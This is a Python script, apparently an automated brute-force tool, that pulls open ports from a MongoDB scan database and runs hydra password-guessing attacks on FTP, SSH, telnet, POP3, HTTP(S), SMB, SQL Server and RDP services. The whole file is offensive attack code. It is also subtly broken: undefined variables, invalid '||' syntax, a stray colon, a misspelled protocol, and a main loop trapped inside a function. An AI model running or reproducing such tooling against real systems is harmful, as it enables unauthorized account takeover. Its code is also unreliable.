import os
import pymongo

client = pymongo.MongoClient(host='localhost', port=27017)  # 连接数据库
db = client.nmapy  # 指定数据库
set = db.scanre  # 指定要操作的集合



# (ip['port'] == '20') & (ip['state'] == 'open'):
def ftp():
    host = ip['host']
    print('[+]ftp爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -ens ftp://%s ' %host)

# (ip['port'] == '22') & (ip['state'] == 'open'):
def ssh():
    host = ip['host']
    print('[+]ssh爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -ens ssh://%s ' %host)

# (ip['port'] == '23') & (ip['state'] == 'open'):
def telent():
    print('[+]telent爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -ens telent://%s ' %host)

# (ip['port'] == '110') & (ip['state'] == 'open'):
def pop3():
    print('[+]pop3爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -ens pop3://%s ' %host)


# (ip['port'] == '80') & (ip['state'] == 'open'):
def http():
    host = ip['host']
    print('[+]http爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -ens http://%s ' %host)

# (ip['port'] == '443') & (ip['state'] == 'open'):
def https():
    host = ip['host']
    print('[+]https爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -ens https://%s ' %host)
    
# (ip['port'] == '137'||'139'||'445') & (ip['state'] == 'open'):
def smb():
    host = ip['host']
    print('[+]smb爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -ens smb://%s ' %host)

# (ip['port'] == '1433') & (ip['state'] == 'open'):
def SQLServer():
    host = ip['host']
    print('[+]SQLServer爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -ens SQLServer://%s ' %host)

# (ip['port'] == '3389') & (ip['state'] == 'open'):
def rdp():
    print('[+]rdp爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -ens rdp://%s ' %host)


    for ip in set.find():

        if (ip['port'] == '20') & (ip['state'] == 'open'):
            ftp()
        if (ip['port'] == '22') & (ip['state'] == 'open'):
            ssh()
        if (ip['port'] == '23') & (ip['state'] == 'open'):
            telent()
        if (ip['port'] == '80') & (ip['state'] == 'open'):
            http()
        if (ip['port'] == '110') & (ip['state'] == 'open'):
            pop3()
        if (ip['port'] == '443') & (ip['state'] == 'open'):
            https()
        if (ip['port'] == '137'||'139'||'445') & (ip['state'] == 'open'):
            smb()
        if (ip['port'] == '1433') & (ip['state'] == 'open'):
            SQLServer():
        if (ip['port'] == '3389') & (ip['state'] == 'open'):
            rdp()
            
            
        
